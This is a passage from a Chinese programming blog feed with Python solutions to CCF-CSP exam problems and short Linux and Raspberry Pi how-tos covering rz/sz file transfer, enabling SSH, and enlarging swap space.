<h5 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201403-2</div><div class="line">试题名称：窗口</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    在某图形操作系统中,有 N 个窗口,每个窗口都是一个两边与坐标轴分别平行的矩形区域。窗口的边界上的点也属于该窗口。窗口之间有层次的区别,在多于一个窗口重叠的区域里,只会显示位于顶层的窗口里的内容。</div><div class="line">    当你点击屏幕上一个点的时候,你就选择了处于被点击位置的最顶层窗口,并且这个窗口就会被移到所有窗口的最顶层,而剩余的窗口的层次顺序不变。如果你点击的位置不属于任何窗口,则系统会忽略你这次点击。</div><div class="line">    现在我们希望你写一个程序模拟点击窗口的过程。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行有两个正整数,即 N 和 M。(1 ≤ N ≤ 10,1 ≤ M ≤ 10)</div><div class="line">    接下来 N 行按照从最下层到最顶层的顺序给出 N 个窗口的位置。 每行包含四个非负整数 x1, y1, x2, y2,表示该窗口的一对顶点坐标分别为 (x1, y1) 和 (x2, y2)。保证 x1 &lt; x2,y1 2。</div><div class="line">    接下来 M 行每行包含两个非负整数 x, y,表示一次鼠标点击的坐标。</div><div class="line">    题目中涉及到的所有点和矩形的顶点的 x, y 坐标分别不超过 2559 和 1439。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出包括 M 行,每一行表示一次鼠标点击的结果。如果该次鼠标点击选择了一个窗口,则输出这个窗口的编号(窗口按照输入中的顺序从 1 编号到 N);如果没有,则输出&quot;IGNORED&quot;(不含双引号)。</div><div class="line"></div><div class="line">样例输入</div><div class="line">3 4</div><div class="line">0 0 4 4</div><div class="line">1 1 5 5</div><div class="line">2 2 6 6</div><div class="line">1 1</div><div class="line">0 0</div><div class="line">4 4</div><div class="line">0 5</div><div class="line"></div><div class="line">样例输出</div><div class="line">2</div><div class="line">1</div><div class="line">1</div><div class="line">IGNORED</div><div class="line"></div><div class="line">样例说明</div><div class="line">    第一次点击的位置同时属于第 1 和第 2 个窗口,但是由于第 2 个窗口在上面,它被选择并且被置于顶层。</div><div class="line">    第二次点击的位置只属于第 1 个窗口,因此该次点击选择了此窗口并将其置于顶层。现在的三个窗口的层次关系与初始状态恰好相反了。</div><div class="line">    第三次点击的位置同时属于三个窗口的范围,但是由于现在第 1 个窗口处于顶层,它被选择。</div><div class="line">    最后点击的 (0, 5) 不属于任何窗口。</div></pre></td></tr></table></figure>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　用二维数组做标记，初始标记坐标在哪个窗口，然后依次执行点击，点击后，如果二维数组中对应坐标的值为 0，输出 IGNORED；否则，先输出窗口号，将被点击窗口的所有坐标对应的二维数组中的值设置成该窗口的窗口号。这道题只得了60分（待解决）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n, m = list(map(int, input().split()))</div><div class="line">L = [[<span class="number">0</span>] * <span class="number">2559</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1439</span>)]  <span class="comment"># 用于标记的数组</span></div><div class="line">lst = []</div><div class="line">rst = []</div><div class="line">count = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(n):</div><div class="line">    lst.append(list(map(int, input().split())))  <span class="comment"># 输入窗口顶点坐标</span></div><div class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(m):</div><div class="line">    rst.append(list(map(int, input().split())))  <span class="comment"># 输入鼠标点击坐标</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:  <span class="comment"># 标记坐标在哪个窗口</span></div><div class="line">    count += <span class="number">1</span></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(i[<span class="number">0</span>], i[<span class="number">2</span>] + <span class="number">1</span>):</div><div class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(i[<span class="number">1</span>], i[<span class="number">3</span>] + <span class="number">1</span>):</div><div class="line">            L[x][y] = count</div><div class="line"></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> rst:  <span class="comment"># 判断鼠标点击的点在哪个窗口</span></div><div class="line">    click = L[j[<span class="number">0</span>]][j[<span class="number">1</span>]]</div><div class="line">    <span class="keyword">if</span> click == <span class="number">0</span>:  <span class="comment"># 没有窗口</span></div><div class="line">        print(<span class="string">"IGNORED"</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(click)  <span class="comment"># 输出窗口号</span></div><div class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(lst[click - <span class="number">1</span>][<span class="number">0</span>], lst[click - <span class="number">1</span>][<span class="number">2</span>] + <span class="number">1</span>):  <span class="comment"># 将被点击窗口置顶</span></div><div class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(lst[click - <span class="number">1</span>][<span class="number">1</span>], lst[click - <span class="number">1</span>][<span class="number">3</span>] + <span class="number">1</span>):</div><div class="line">                L[x][y] = click</div></pre></td></tr></table></figure>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　该问题本质是匹配，即鼠标点击坐标与窗口坐标的匹配问题。通过两个循环来解决，从第一个鼠标点击坐标开始，与顶层的窗口顶点坐标开始匹配，若该鼠标点击坐标在某个窗口坐标的范围内，则输出该窗口的编号，并将该窗口置顶，输出顶层坐标的编号。否则，输出 IGNORED 表示未找到。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n, m = map(int, input().split())</div><div class="line">v = []</div><div class="line">c = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">    v.append(list(map(int, input().split())))  <span class="comment"># 输入窗口顶点坐标</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(m):</div><div class="line">    c.append(list(map(int, input().split())))  <span class="comment"># 输入鼠标点击坐标</span></div><div class="line">s = v[:]  <span class="comment"># 复制，用于得到顶层坐标的编号</span></div><div class="line">v.reverse()  <span class="comment"># 将窗口顶点坐标翻转，即要从顶层窗口开始匹配</span></div><div class="line">flag = <span class="number">1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(m):  <span class="comment"># 点击次数</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(n):  <span class="comment"># 窗口个数</span></div><div class="line">        <span class="keyword">if</span> (c[i][<span class="number">0</span>] &gt;= v[j][<span class="number">0</span>] <span class="keyword">and</span> c[i][<span class="number">1</span>] &gt;= v[j][<span class="number">1</span>]) <span class="keyword">and</span> (</div><div class="line">                c[i][<span class="number">0</span>] &lt;= v[j][<span class="number">2</span>] <span class="keyword">and</span> c[i][<span class="number">1</span>] &lt;= v[j][<span class="number">3</span>]):  <span class="comment"># 若该鼠标点击坐标在某个窗口坐标的范围内</span></div><div class="line">            flag = <span class="number">1</span>  <span class="comment"># 标记为点中某个窗口</span></div><div class="line">            <span class="keyword">if</span> j != <span class="number">0</span>:  <span class="comment"># 如果与鼠标点击坐标匹配的不是顶层窗口</span></div><div class="line">                v.insert(<span class="number">0</span>, v[j])  <span class="comment"># 则将窗口的顶点坐标置顶，即插入列表的第一个位置</span></div><div class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(j + <span class="number">1</span>, n):</div><div class="line">                    v[k] = v[k + <span class="number">1</span>]  <span class="comment"># 其他窗口的顶点坐标，依次跟在顶层窗口坐标后</span></div><div class="line">            print(s.index(v[<span class="number">0</span>]) + <span class="number">1</span>)  <span class="comment"># 输出顶层坐标的编号</span></div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            flag = <span class="number">0</span>  <span class="comment"># 没有找到匹配的窗口</span></div><div class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:</div><div class="line">        print(<span class="string">'IGNORED'</span>)</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 学生排队</title>
    <url>/2018/11/26/CCF-CSP-%E5%AD%A6%E7%94%9F%E6%8E%92%E9%98%9F/</url>
    <content><![CDATA[<center>CCF-CSP 201703-2 学生排队 题解</center>

<a id="more"></a>
<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201703-2</div><div class="line">试题名称：学生排队</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    体育老师小明要将自己班上的学生按顺序排队。他首先让学生按学号从小到大的顺序排成一排，学号小的排在前面，然后进行多次调整。一次调整小明可能让一位同学出队，向前或者向后移动一段距离后再插入队列。</div><div class="line">    例如，下面给出了一组移动的例子，例子中学生的人数为8人。</div><div class="line">    0）初始队列中学生的学号依次为1, 2, 3, 4, 5, 6, 7, 8；</div><div class="line">    1）第一次调整，命令为“3号同学向后移动2”，表示3号同学出队，向后移动2名同学的距离，再插入到队列中，新队列中学生的学号依次为1, 2, 4, 5, 3, 6, 7, 8；</div><div class="line">    2）第二次调整，命令为“8号同学向前移动3”，表示8号同学出队，向前移动3名同学的距离，再插入到队列中，新队列中学生的学号依次为1, 2, 4, 5, 8, 3, 6, 7；</div><div class="line">    3）第三次调整，命令为“3号同学向前移动2”，表示3号同学出队，向前移动2名同学的距离，再插入到队列中，新队列中学生的学号依次为1, 2, 4, 3, 5, 8, 6, 7。</div><div class="line">    小明记录了所有调整的过程，请问，最终从前向后所有学生的学号依次是多少？</div><div class="line">    请特别注意，上述移动过程中所涉及的号码指的是学号，而不是在队伍中的位置。在向后移动时，移动的距离不超过对应同学后面的人数，如果向后移动的距离正好等于对应同学后面的人数则该同学会移动到队列的最后面。在向前移动时，移动的距离不超过对应同学前面的人数，如果向前移动的距离正好等于对应同学前面的人数则该同学会移动到队列的最前面。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行包含一个整数n，表示学生的数量，学生的学号由1到n编号。</div><div class="line">    第二行包含一个整数m，表示调整的次数。</div><div class="line">    接下来m行，每行两个整数p, q，如果q为正，表示学号为p的同学向后移动q，如果q为负，表示学号为p的同学向前移动-q。</div><div class="line">　　</div><div class="line">输出格式</div><div class="line">    输出一行，包含n个整数，相邻两个整数之间由一个空格分隔，表示最终从前向后所有学生的学号。</div><div class="line"></div><div class="line">样例输入</div><div class="line">8</div><div class="line">3</div><div class="line">3 2</div><div class="line">8 -3</div><div class="line">3 -2</div><div class="line"></div><div class="line">样例输出</div><div class="line">1 2 4 3 5 8 6 7</div><div class="line"></div><div class="line">评测用例规模与约定</div><div class="line">    对于所有评测用例，1 ≤ n ≤ 1000，1 ≤ m ≤ 1000，所有移动均合法。</div></pre></td></tr></table></figure>
<h4 id="题解1"><a href="#题解1" class="headerlink" title="题解1"></a>题解1</h4><p>　　这道题目思路比较简单，只要每次临时存储要移动的元素，然后考虑是向前移动还是向后移动。如果是向前移动q，则把这个元素前面的q个元素依次向后移动1位，然后再把这个元素放到空出来的那个位置即可。如果是向后移动q，则把这个元素后面的q个元素依次向前移动1位，然后再把这个元素放到空出来的那个位置即可。每次移动都按这个逻辑，最后输出结果即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())	<span class="comment"># 学生的数量</span></div><div class="line">m = int(input())	<span class="comment"># 调整的次数</span></div><div class="line">L = list(range(<span class="number">1</span>, n+<span class="number">1</span>))	<span class="comment"># 初始排队序列</span></div><div class="line">lst = []</div><div class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(m):</div><div class="line">    i = list(map(int, input().split()))</div><div class="line">    index = L.index(i[<span class="number">0</span>])  <span class="comment"># 获取要移动的元素的当前索引</span></div><div class="line">    tmp = L[index]	<span class="comment"># 临时存储要移动的元素</span></div><div class="line">    <span class="keyword">if</span> i[<span class="number">1</span>] &gt; <span class="number">0</span>:    <span class="comment"># 学生向后移，让他后面的|q|个学生依次向前移动1位</span></div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(index, index+i[<span class="number">1</span>]):</div><div class="line">            L[j] = L[j+<span class="number">1</span>]</div><div class="line">    <span class="keyword">else</span>:   <span class="comment"># 学生向前移，让他前面的|q|个学生依次向后移动1位</span></div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(index, index-abs(i[<span class="number">1</span>]), <span class="number">-1</span>):</div><div class="line">            L[j] = L[j<span class="number">-1</span>]</div><div class="line">    L[index+i[<span class="number">1</span>]] = tmp	<span class="comment"># 要移动的学生，移动到指定位置</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L:	<span class="comment"># 输出结果</span></div><div class="line">    print(i, end=<span class="string">" "</span>)</div></pre></td></tr></table></figure>
<h4 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h4><p>　　还有一种方法是不需要考虑向前移动还是向后移动，把学生存储在 L 列表中，每次调整时，找出当前学生在列表中的下标，然后把该学生删掉，同时在列表末尾新增一个 0 元素。接着从后往前循环学生列表，到删除学生的下标 +1 为止，依次互换列表中的值，直到 0 元素到达删除的学生下标处；接着要做的就是把删除的学生号重新赋值进去 0 的位置。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())	<span class="comment"># 学生的数量</span></div><div class="line">m = int(input())	<span class="comment"># 调整的次数</span></div><div class="line">L = list(range(<span class="number">1</span>, n + <span class="number">1</span>))	<span class="comment"># 初始排队序列</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(m):</div><div class="line">    i = list(map(int, input().split()))</div><div class="line">    p = i[<span class="number">0</span>]  <span class="comment"># 调整的学生</span></div><div class="line">    q = i[<span class="number">1</span>]  <span class="comment"># 调整值</span></div><div class="line">    k = L.index(p)  <span class="comment"># 学生下标</span></div><div class="line">    k += q  <span class="comment"># 调整后的下标，这样就无需考虑正负</span></div><div class="line">    L.remove(p)	<span class="comment"># 学生暂时出列表</span></div><div class="line">    L.append(<span class="number">0</span>)	<span class="comment"># 先填充0</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(k + <span class="number">1</span>, n)[::<span class="number">-1</span>]: <span class="comment"># 从后往前，到删除学生的下标 +1 为止</span></div><div class="line">        L[j], L[j - <span class="number">1</span>] = L[j - <span class="number">1</span>], L[j]	<span class="comment"># 互换列表中的值</span></div><div class="line">    L[k] = p	<span class="comment"># 其他学生调整好以后，该学生到列表的指定位置</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L:	<span class="comment"># 输出结果</span></div><div class="line">    print(i, end=<span class="string">' '</span>)</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux rz 和 sz 命令</title>
    <url>/2018/11/20/Linux-rz-%E5%92%8C-sz-%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>　　使用 rz 和 sz 工具实现客户端与 Linux 服务器端的文件交互。</p>
<a id="more"></a>
<p>　　以 Windows 客户端和 Ubuntu 服务器之间的文件交互为例来进行说明。</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><h5 id="apt-安装"><a href="#apt-安装" class="headerlink" title="apt 安装"></a>apt 安装</h5><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ sudo apt-get install lrzsz</div></pre></td></tr></table></figure>
<h5 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h5><ol>
<li>下载</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ wget https://www.ohse.de/uwe/releases/lrzsz-0.12.20.tar.gz</div></pre></td></tr></table></figure>
<ol>
<li>解压</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ tar -xzf lrzsz-0.12.20.tar.gz</div></pre></td></tr></table></figure>
<ol>
<li>编译安装</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> lrzsz-0.12.20</div><div class="line">$ ./configure --prefix=/usr/<span class="built_in">local</span>/lrzsz</div><div class="line">$ sudo make</div><div class="line">$ sudo make install</div></pre></td></tr></table></figure>
<ol>
<li>创建连接</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> /usr/bin</div><div class="line">$ sudo ln -s /usr/<span class="built_in">local</span>/lrzsz/bin/lrz rz</div><div class="line">$ sudo ln -s /usr/<span class="built_in">local</span>/lrzsz/bin/lsz sz</div></pre></td></tr></table></figure>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><h5 id="sz（下载）"><a href="#sz（下载）" class="headerlink" title="sz（下载）"></a>sz（下载）</h5><p>　　sz 命令发送文件到本地：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ sz filename</div></pre></td></tr></table></figure>
<h5 id="rz（上传）"><a href="#rz（上传）" class="headerlink" title="rz（上传）"></a>rz（上传）</h5><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ rz</div></pre></td></tr></table></figure>
<p>　　执行该命令后，在弹出框中选择要上传的文件即可。</p>
<p>　　在 SecureCRT 软件中，可以设置上传下载的目录。点击Options -&gt; session options -&gt; X/Y/Zmodem 即可。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>rz/sz</tag>
      </tags>
  </entry>
  <entry>
    <title>Raspberry Pi 开启 SSH 服务</title>
    <url>/2018/11/16/Raspberry-Pi-%E5%BC%80%E5%90%AF-SSH-%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<p>　　解决新版本 Raspbian 操作系统默认不开启 SSH 服务的问题。</p>
<a id="more"></a>
<p>　　旧版 Raspberry Pi 的 Raspbian 系统默认开启 SSH 功能，但是新版默认是关闭的，这对于没有显示器，需要通过 SSH 连接的用户带来一些不便，这里总结了 Raspbian 中几种开启 SSH 的方法。</p>
<h5 id="方法-1"><a href="#方法-1" class="headerlink" title="方法 1"></a>方法 1</h5><p>　　将TF卡取下来，插上电脑，在  TF 卡的根目录下创建一个空白的文件，文件名叫：ssh。系统启动后会自动开启 ssh 服务。</p>
<h5 id="方法-2"><a href="#方法-2" class="headerlink" title="方法 2"></a>方法 2</h5><p>　　检查 Raspberry Pi SSH 服务是否开启：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">ps -e | grep ssh</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/11/16-1.png" alt="16-1"></p>
<p>　　ssh-agent 为客户端，sshd 为服务器端服务，只有 ssh-agent 没有 sshd 表明 SSH 服务还没有开启。如果发现没有安装 SSH 服务，则使用以下命令安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ sudo apt-get install openssh-server</div></pre></td></tr></table></figure>
<p>　　如果已经安装，但是没开启，则使用以下命令开启 SSH 服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ sudo /etc/init.d/ssh start</div></pre></td></tr></table></figure>
<p>　　如果需要修改 SSH 服务的配置，则需要找到 openssh-server 的配置文件 <code>/etc/ssh/sshd_config</code>，其中包含 SSH 服务的各项参数，如默认端口为 22，可以配置为其他端口，配置后重启生效。</p>
<p>　　另外，也可以设置 SSH 服务开机自动启动，打开 <code>/etc/rc.local</code> 文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ sudo nano /etc/rc.local</div></pre></td></tr></table></figure>
<p>　　在语句 <code>exit 0</code> 之前加入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">/etc/init.d/ssh start</div></pre></td></tr></table></figure>
<h5 id="方法-3"><a href="#方法-3" class="headerlink" title="方法 3"></a>方法 3</h5><p>　　在 Raspbian 依次打开 菜单（Menu） &gt; 首选项（Preferences） &gt; Raspberry Pi Configuration，然后点击 Interfaces 栏，选择 “enable” SSH服务：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/11/16-2.png" alt="16-2"></p>
<h5 id="方法-4"><a href="#方法-4" class="headerlink" title="方法 4"></a>方法 4</h5><p>　　使用命令进入 Raspberry Pi 的系统配置界面：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ sudo raspi-config</div></pre></td></tr></table></figure>
<p>　　然后，选择 “5 Interfacing Options”，回车，再选择第二项 SSH，回车，选择 yes，回车，搞定！</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>Raspberry Pi</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>Raspberry Pi 虚拟内存配置</title>
    <url>/2018/11/12/Raspberry-Pi-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>　　解决 Raspberry Pi 编译项目时提示虚拟内存不足的问题。</p>
<a id="more"></a>
<h5 id="虚拟内存不足"><a href="#虚拟内存不足" class="headerlink" title="虚拟内存不足"></a>虚拟内存不足</h5><p>　　在 Raspberry Pi model 3B 上编译C++项目时，得到以下错误提示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Virtual memory exhausted: Cannot allocate memory</div></pre></td></tr></table></figure>
<p>　　相比于单片机等嵌入式设备，Raspberry Pi 已经拥有足够强大的处理能力。Raspberry Pi 从 model A 的 256MB 内存到 model 3B+ 的 1G 内存，这对于大多数应用程序来说，这个内存量实际上是足够的。但是，面对二进制文件编译，这样的内存空间往往是不够的，因此，无法编译很多项目。</p>
<p>　　Raspbian 发行版附带一个 100MB 的 swapfile，这其实就时虚拟内存。但是，默认的设置实际上有点偏小。一般的经验是虚拟内存大小应该是机器上可用内存的两倍。</p>
<h5 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h5><p>　　修改配置文件中 swapfile 的大小：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ sudo nano /etc/dphys-swapfile</div></pre></td></tr></table></figure>
<p>　　默认是 100MB：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">CONF_SWAPSIZE=100</div></pre></td></tr></table></figure>
<p>　　使用以下命令可以查看内存与虚拟内存：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ free -m</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/11/12-1.png" alt="12-1"></p>
<p>　　我们把它修改成：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">CONF_SWAPSIZE=1024</div></pre></td></tr></table></figure>
<p>　　然后，先停止再启动管理 swapfile  的 Rasbian 服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ sudo /etc/init.d/dphys-swapfile stop</div><div class="line">$ sudo /etc/init.d/dphys-swapfile start</div></pre></td></tr></table></figure>
<p>　　再次查看内存与虚拟内存，验证是否设置成功：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/11/12-2.png" alt="12-2"></p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>Raspberry Pi</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 游戏</title>
    <url>/2018/10/28/CCF-CSP-%E6%B8%B8%E6%88%8F/</url>
    <content><![CDATA[<center>CCF-CSP 201712-2 游戏 题解</center>

<a id="more"></a>
<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">试题编号：<span class="number">201712</span><span class="number">-2</span></div><div class="line">试题名称：游戏</div><div class="line">时间限制：<span class="number">1.0</span>s</div><div class="line">内存限制：<span class="number">256.0</span>MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    有n个小朋友围成一圈玩游戏，小朋友从<span class="number">1</span>至n编号，<span class="number">2</span>号小朋友坐在<span class="number">1</span>号小朋友的顺时针方向，<span class="number">3</span>号小朋友坐在<span class="number">2</span>号小朋友的顺时针方向，……，<span class="number">1</span>号小朋友坐在n号小朋友的顺时针方向。</div><div class="line">    游戏开始，从<span class="number">1</span>号小朋友开始顺时针报数，接下来每个小朋友的报数是上一个小朋友报的数加<span class="number">1</span>。若一个小朋友报的数为k的倍数或其末位数（即数的个位）为k，则该小朋友被淘汰出局，不再参加以后的报数。当游戏中只剩下一个小朋友时，该小朋友获胜。</div><div class="line">    例如，当n=<span class="number">5</span>, k=<span class="number">2</span>时：</div><div class="line">    <span class="number">1</span>号小朋友报数<span class="number">1</span>；</div><div class="line">    <span class="number">2</span>号小朋友报数<span class="number">2</span>淘汰；</div><div class="line">    <span class="number">3</span>号小朋友报数<span class="number">3</span>；</div><div class="line">    <span class="number">4</span>号小朋友报数<span class="number">4</span>淘汰；</div><div class="line">    <span class="number">5</span>号小朋友报数<span class="number">5</span>；</div><div class="line">    <span class="number">1</span>号小朋友报数<span class="number">6</span>淘汰；</div><div class="line">    <span class="number">3</span>号小朋友报数<span class="number">7</span>；</div><div class="line">    <span class="number">5</span>号小朋友报数<span class="number">8</span>淘汰；</div><div class="line">    <span class="number">3</span>号小朋友获胜。</div><div class="line"></div><div class="line">    给定n和k，请问最后获胜的小朋友编号为多少？</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入一行，包括两个整数n和k，意义如题目所述。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出一行，包含一个整数，表示获胜的小朋友编号。</div><div class="line"></div><div class="line">样例输入</div><div class="line"><span class="number">5</span> <span class="number">2</span></div><div class="line"></div><div class="line">样例输出</div><div class="line"><span class="number">3</span></div><div class="line"></div><div class="line">样例输入</div><div class="line"><span class="number">7</span> <span class="number">3</span></div><div class="line"></div><div class="line">样例输出</div><div class="line"><span class="number">4</span></div><div class="line"></div><div class="line">数据规模和约定</div><div class="line">    对于所有评测用例，<span class="number">1</span> ≤ n ≤ <span class="number">1000</span>，<span class="number">1</span> ≤ k ≤ <span class="number">9</span>。</div></pre></td></tr></table></figure>
<h4 id="题解1"><a href="#题解1" class="headerlink" title="题解1"></a>题解1</h4><p>　　最容易想到的方法应该是用数组来标记是否已经出局。首先，初始化编号数组，然后开始报数，每次都检查是否已经出局，若已经出局则直接跳过，否则检查报数是否为k的倍数或其末位数（即数的个位）为k，如果是，则将该数组元素置为0，即标记为出局。一直报数，直到数组中非 0 元素只有1个才停止，最后输出这个非 0 元素的索引即为获胜小朋友的编号。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n, k = map(int, input().split())  <span class="comment"># 读取输入n, k</span></div><div class="line">lst = list(range(<span class="number">1</span>, n + <span class="number">1</span>))  <span class="comment"># 编号列表</span></div><div class="line"></div><div class="line">count = <span class="number">0</span>  <span class="comment"># 报数计数</span></div><div class="line"><span class="keyword">if</span> k != <span class="number">1</span>:</div><div class="line">    <span class="keyword">while</span> lst.count(<span class="number">0</span>) != n - <span class="number">1</span>:  <span class="comment"># 一直报数，直到只剩下 1 个小朋友</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">            <span class="keyword">if</span> lst[i] == <span class="number">0</span>:  <span class="comment"># 该小朋友已出局，不再报数</span></div><div class="line">                <span class="keyword">continue</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                count += <span class="number">1</span>  <span class="comment"># 报数</span></div><div class="line">                s = str(count)</div><div class="line">                <span class="keyword">if</span> count % k == <span class="number">0</span> <span class="keyword">or</span> int(s[len(s) - <span class="number">1</span>]) == k:  <span class="comment"># 报数为k的倍数或其末位数（即数的个位）为k</span></div><div class="line">                    lst[i] = <span class="number">0</span>  <span class="comment"># 标记为已出局</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n + <span class="number">1</span>):</div><div class="line">        <span class="keyword">if</span> lst[i - <span class="number">1</span>] &gt; <span class="number">0</span>:  <span class="comment"># 输出未出局的小朋友</span></div><div class="line">            print(i)  <span class="comment"># 输出结果</span></div><div class="line">            <span class="keyword">break</span></div><div class="line"><span class="keyword">else</span>:  <span class="comment"># 若 k 为1，则直接输出最后 1 个小朋友的编号</span></div><div class="line">    print(n)</div></pre></td></tr></table></figure>
<h4 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h4><p>　　用队列模拟的方式来解题。首先，列表中存储 n 个小朋友的编号，每次取出第 1 个元素进行判断，如果报数不为k的倍数并且其末位数（即数的个位）也不为k，则又将其加入到列表的尾部，直到编号列表中没有元素都</p>
